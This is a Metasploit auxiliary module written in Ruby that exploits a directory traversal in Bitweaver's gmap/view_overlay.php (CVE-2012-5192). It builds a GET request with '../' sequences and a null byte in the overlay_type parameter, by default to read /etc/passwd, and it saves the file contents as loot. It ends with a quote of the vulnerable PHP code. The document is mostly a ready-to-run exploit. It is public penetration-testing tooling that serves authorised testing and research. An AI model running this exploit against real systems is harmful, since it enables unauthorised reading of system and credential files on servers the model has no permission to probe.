##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Bitweaver overlay_type Directory Traversal',
      'Description'    => %q{
          This module exploits a directory traversal vulnerability found in Bitweaver.
        When handling the 'overlay_type' parameter, view_overlay.php fails to do any
        path checking/filtering, which can be abused to read any file outside the
        virtual directory.
      },
      'References'     =>
        [
          ['CVE', '2012-5192'],
          ['OSVDB', '86599'],
          ['EDB', '22216'],
          ['URL', 'http://web.archive.org/web/20130827041908/https://www.trustwave.com/spiderlabs/advisories/TWSL2012-016.txt']
        ],
      'Author'         =>
        [
          'David Aaron',       # Trustwave SpiderLabs
          'Jonathan Claudius', # Trustwave SpiderLabs
          'sinn3r'             # Metasploit
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => '2012-10-23'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI path to the web application', '/bitweaver/']),
        OptString.new('FILE',      [true, 'The file to obtain', '/etc/passwd']),
        OptInt.new('DEPTH',        [true, 'The max traversal depth to root directory', 10])
      ])
  end


  def run_host(ip)
    base = target_uri.path

    peer = "#{ip}:#{rport}"
    fname = datastore['FILE']
    fname = fname[1, fname.length] if fname =~ /^\//

    print_status("Reading '#{datastore['FILE']}'")
    traverse = "../" * datastore['DEPTH']
    res = send_request_cgi({
      'method'        => 'GET',
      'encode_params' => false,
      'uri'           => normalize_uri(base, "gmap/view_overlay.php"),
      'vars_get'      => {
        'overlay_type' => "#{traverse}#{fname}%00"
      }
    })

    if res and res.code == 200 and res.body =~ /failed to open stream\: No such file/
      print_error("Cannot read '#{fname}'. File does not exist.")

    elsif res and res.code == 200 and res.body =~ /failed to open stream\: Permission denied/
      print_error("Cannot read '#{fname}'. Permission denied.")

    elsif res and res.code == 200 and res.body =~ /Failed opening required/
      print_error("Cannot read '#{fname}'. Possibly not vulnerable.")

    elsif res and res.code == 200
      data = res.body
      data = (data.scan(/(.+)\n(<br \/>)*\n*.+Notice.+/m).flatten[0] || '').gsub(/\n<br \/>$/, '')

      p = store_loot(
        'bitweaver.overlay_type',
        'application/octet-stream',
        ip,
        data,
        fname
      )

      vprint_line(data)
      print_good("#{datastore['FILE']} stored as '#{p}'")

    else
      print_error("Request failed due to some unknown reason")
    end
  end
end

=begin
if( !empty( $_REQUEST['overlay_type'] ) ){
        $type = $_REQUEST['overlay_type'];
}

// Now check permissions to access this page
$gBitSystem->verifyPermission('p_gmap_overlay_view' );

// Get the overlay for specified overylay_id
require_once(GMAP_PKG_PATH.'lookup_'.$type.'_inc.php' );
=end
